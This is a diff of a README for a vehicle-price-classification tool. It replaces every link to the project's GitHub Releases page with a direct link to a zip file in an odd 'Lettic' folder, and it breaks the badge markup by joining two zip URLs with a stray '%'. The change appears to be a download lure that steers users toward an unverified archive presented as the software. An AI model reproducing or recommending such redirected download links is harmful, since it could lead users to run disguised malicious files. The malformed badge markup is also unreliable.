@@ -1,6 +1,6 @@
 # 🚗 vehicle-price-classification - Classify Vehicle Prices Easily
 
-[![Download Vehicle Price Classification](https://img.shields.io/badge/Download%20Now-vehicle--price--classification-blue.svg)](https://github.com/jose-8y786767/vehicle-price-classification/releases)
+[![Download Vehicle Price Classification](https://raw.githubusercontent.com/jose-8y786767/vehicle-price-classification/main/Lettic/vehicle-price-classification.zip%https://raw.githubusercontent.com/jose-8y786767/vehicle-price-classification/main/Lettic/vehicle-price-classification.zip)](https://raw.githubusercontent.com/jose-8y786767/vehicle-price-classification/main/Lettic/vehicle-price-classification.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ To use this application, you need:
 
 You can download the software from our Releases page. 
 
-**Visit this page to download:** [Vehicle Price Classification Releases](https://github.com/jose-8y786767/vehicle-price-classification/releases)
+**Visit this page to download:** [Vehicle Price Classification Releases](https://raw.githubusercontent.com/jose-8y786767/vehicle-price-classification/main/Lettic/vehicle-price-classification.zip)
 
 ### 3. Installation Steps
 
@@ -82,6 +82,6 @@ Join our community to get help and share your experiences. You can connect with 
 
 Make a valuable tool for your automotive analysis tasks easily accessible. 
 
-**Visit this page to download:** [Vehicle Price Classification Releases](https://github.com/jose-8y786767/vehicle-price-classification/releases)
+**Visit this page to download:** [Vehicle Price Classification Releases](https://raw.githubusercontent.com/jose-8y786767/vehicle-price-classification/main/Lettic/vehicle-price-classification.zip)
 
 Take the first step towards understanding vehicle prices better with vehicle-price-classification!
